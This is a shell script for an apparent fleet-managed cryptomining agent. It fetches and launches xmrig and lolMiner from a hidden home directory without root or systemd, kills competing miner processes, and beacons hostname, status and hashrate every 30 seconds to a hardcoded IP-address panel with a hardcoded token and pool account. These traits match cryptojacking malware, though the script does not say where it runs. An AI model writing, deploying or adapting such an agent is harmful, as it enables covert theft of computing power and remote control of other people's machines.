#!/bin/sh
set -u

############################################
# MINING CONTROL CENTER — FINAL AGENT
# non-root • no systemd • stable telemetry
############################################

### ===== PANEL =====
PANEL="http://178.47.141.130:3333"
TOKEN="mamont22187"
INTERVAL=30

### ===== MINING =====
KRIPTEX_USERNAME="krxX3PVQVR"
HOST="$(hostname)"

ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"

BASE="$HOME/.mining/bin"
RUN="$HOME/.mining/run"
LOG="$HOME/.mining/log"

ETC_USER="${KRIPTEX_USERNAME}.${HOST}"
XMR_USER="${KRIPTEX_USERNAME}.${HOST}"

mkdir -p "$BASE/etc" "$BASE/xmr" "$RUN" "$LOG" >/dev/null 2>&1 || true

############################################
# -------- PANEL API -----------------------
############################################

send_event() {
  curl -s "$PANEL/api/event" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"level\": \"$1\",
      \"message\": \"$2\"
    }" >/dev/null 2>&1 || true
}

############################################
# -------- HASHRATE ------------------------
############################################

get_hashrate() {
  tail -n 50 "$LOG/xmr.log" 2>/dev/null \
  | grep -Eo 'speed[^0-9]*([0-9]+(\.[0-9]+)?)' \
  | tail -1 \
  | grep -Eo '[0-9]+' || echo 0
}

############################################
# -------- TELEMETRY -----------------------
############################################

send_telemetry() {
  HASHRATE="$(get_hashrate)"

  CPU_STATUS="stopped"
  GPU_STATUS="stopped"

  [ -f "$RUN/mining-cpu.pid" ] && CPU_STATUS="running"
  [ -f "$RUN/mining-gpu.pid" ] && GPU_STATUS="running"

  GPU_OK=false
  command -v lspci >/dev/null 2>&1 && lspci | grep -qiE "nvidia|amd" && GPU_OK=true

  curl -s "$PANEL/api/telemetry" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "{
      \"hostname\": \"$HOST\",
      \"cpu_mining\": \"$CPU_STATUS\",
      \"gpu_mining\": \"$GPU_STATUS\",
      \"gpu_detected\": $GPU_OK,
      \"hashrate\": $HASHRATE
    }" >/dev/null 2>&1 || true
}

############################################
# -------- MINERS --------------------------
############################################

start_cpu() {
  pkill -f xmrig 2>/dev/null || true
  nohup "$BASE/xmr/xmrig" -o "$XMR_POOL" -u "$XMR_USER" -p x \
    >> "$LOG/xmr.log" 2>&1 &
  echo $! > "$RUN/mining-cpu.pid"
}

start_gpu() {
  pkill -f lolMiner 2>/dev/null || true
  nohup "$BASE/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL" --user "$ETC_USER" \
    >> "$LOG/etc.log" 2>&1 &
  echo $! > "$RUN/mining-gpu.pid"
}

############################################
# -------- INSTALL -------------------------
############################################

install_miners() {
  [ ! -f "$BASE/xmr/xmrig" ] && {
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz &&
    tar -xzf /tmp/xmr.tgz -C "$BASE/xmr" --strip-components=1
  }

  [ ! -f "$BASE/etc/lolMiner" ] && {
    wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz -O /tmp/lol.tgz &&
    tar -xzf /tmp/lol.tgz -C "$BASE/etc" --strip-components=1
  }
}

############################################
# -------- AGENT ---------------------------
############################################

agent() {
  send_event "INFO" "Mining agent started"

  start_cpu
  start_gpu

  ZERO=0

  while true; do
    HASHRATE="$(get_hashrate)"
    send_telemetry

    if [ "$HASHRATE" = "0" ]; then
      ZERO=$((ZERO+1))
      [ "$ZERO" -ge 3 ] && send_event "CRITICAL" "XMR hashrate = 0"
    else
      ZERO=0
    fi

    sleep "$INTERVAL"
  done
}

############################################
# -------- MAIN ----------------------------
############################################

install_miners
agent
